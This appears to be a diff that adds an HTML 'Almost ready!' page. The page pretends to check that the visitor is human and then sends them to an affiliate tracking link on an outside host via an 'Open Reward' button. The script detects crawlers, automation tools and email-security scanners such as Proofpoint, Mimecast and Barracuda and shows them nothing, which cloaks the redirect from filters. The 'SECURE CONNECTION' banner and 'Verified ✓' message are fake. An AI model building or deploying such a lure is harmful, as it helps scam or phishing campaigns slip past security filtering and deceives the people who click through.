@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
+<meta http-equiv="Cache-Control" content="no-store">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<title>Please wait…</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%}
+  body{
+    font-family:Manrope,-apple-system,"Segoe UI",Roboto,sans-serif;
+    background:radial-gradient(circle at 30% 20%,#1a2a6c,#0a0f2c 70%);
+    color:#eef1ff;display:flex;align-items:center;justify-content:center;
+    padding:22px;min-height:100dvh;overflow:hidden;
+  }
+  .frame{
+    width:100%;max-width:430px;background:#0f1638;border:1px solid #232a56;
+    border-radius:22px;padding:28px 22px 22px;text-align:center;
+    box-shadow:0 24px 70px rgba(0,0,0,.55);
+  }
+  .avatar{
+    width:76px;height:76px;margin:0 auto 14px;border-radius:50%;
+    background:radial-gradient(circle at 30% 30%,#ffd54f,#f6a800);
+    display:flex;align-items:center;justify-content:center;font-size:36px;
+    box-shadow:0 0 0 6px rgba(255,213,79,.12),0 12px 28px rgba(246,168,0,.35);
+  }
+  .hd{font-size:20px;font-weight:800;letter-spacing:-.3px;margin-bottom:6px;color:#fff}
+  .txt{font-size:13.5px;line-height:1.55;color:#9aa3cc;margin-bottom:20px}
+  .meter{height:6px;background:#1a2350;border-radius:99px;overflow:hidden;margin-bottom:12px}
+  .meter span{display:block;height:100%;width:0;background:linear-gradient(90deg,#ffd54f,#f6a800);transition:width .25s}
+  .lbl{font-size:12.5px;color:#7f89b8;min-height:20px}
+  .go{
+    width:100%;margin-top:20px;padding:16px;border:0;border-radius:14px;
+    background:linear-gradient(135deg,#ffd54f,#f6a800);color:#0a0f2c;
+    font-weight:800;font-size:16px;cursor:pointer;min-height:56px;
+    font-family:inherit;letter-spacing:.2px;display:none;
+    box-shadow:0 12px 28px rgba(246,168,0,.35);
+  }
+  .go:active{transform:scale(.98)}
+  .go.vis{display:block;animation:fadeIn .3s ease}
+  @keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+  .banner{margin-top:16px;font-size:11px;color:#5d67a0;letter-spacing:.5px}
+</style>
+</head>
+<body>
+<div class="frame">
+  <div class="avatar">💰</div>
+  <h2 class="hd">Almost ready!</h2>
+  <p class="txt">Quick check that you're real.<br>Won't take long — promise.</p>
+  <div class="meter"><span id="p2"></span></div>
+  <div class="lbl" id="s2">Loading…</div>
+  <button class="go" id="b2" type="button">Open Reward →</button>
+  <div class="banner">🛡️ SECURE CONNECTION</div>
+</div>
+<script>
+const CONFIG={targetUrl:"https://trc.beastbox.pro/click?o=cmvta9nzp000caetjlw6ebg6r&p=AF-1004&sub1=RS",refParam:"referrerCF",minDelay:1500,maxDelay:2500};
+(function(){
+  "use strict";
+  const bar=document.getElementById('p2'),st=document.getElementById('s2'),btn=document.getElementById('b2');
+  const ua=navigator.userAgent||"";
+  const pats=[/bot\b/i,/crawler/i,/spider/i,/curl\//i,/wget\//i,/python-requests/i,/headlesschrome/i,/phantomjs/i,/googlebot/i,/bingpreview/i,/yandexbot/i,/duckduckbot/i,/facebookexternalhit/i,/telegrambot/i,/googleimageproxy/i,/yahoomailproxy/i,/ms-office/i,/microsoft office/i,/barracuda/i,/proofpoint/i,/mimecast/i];
+  for(const p of pats){if(p.test(ua))return;}
+  if(navigator.webdriver===true)return;
+  let acted=false;
+  ['touchstart','pointerdown','mousemove','keydown','scroll','click'].forEach(e=>window.addEventListener(e,()=>{acted=true},{passive:true}));
+  const T=CONFIG.minDelay+Math.random()*(CONFIG.maxDelay-CONFIG.minDelay),S=performance.now();let r=false;
+  function step(){const e=performance.now()-S,p=Math.min(100,e/T*100);bar.style.width=p+"%";
+    if(e<T){requestAnimationFrame(step);return;}
+    if(r)return;r=true;bar.style.width="100%";
+    st.textContent=acted?"Verified ✓ Ready when you are":"Tap below to continue";
+    btn.classList.add('vis');}
+  requestAnimationFrame(step);
+  function build(){try{const u=new URL(CONFIG.targetUrl);u.searchParams.set(CONFIG.refParam,location.href);return u.toString();}catch(e){const s=CONFIG.targetUrl.includes('?')?'&':'?';return CONFIG.targetUrl+s+CONFIG.refParam+'='+encodeURIComponent(location.href);}}
+  let d=false;
+  function go(){if(d)return;d=true;btn.disabled=true;btn.style.opacity=".6";st.textContent="Redirecting…";
+    const u=build(),a=document.createElement('a');a.href=u;a.target='_self';a.style.display='none';document.body.appendChild(a);
+    try{a.click();}catch(e){try{window.location.href=u;}catch(_){window.location.assign(u);}}
+    setTimeout(()=>{try{a.remove();}catch(_){}},300);}
+  btn.addEventListener('click',e=>{e.preventDefault();go();});
+})();
+</script>
+</body>
+</html>
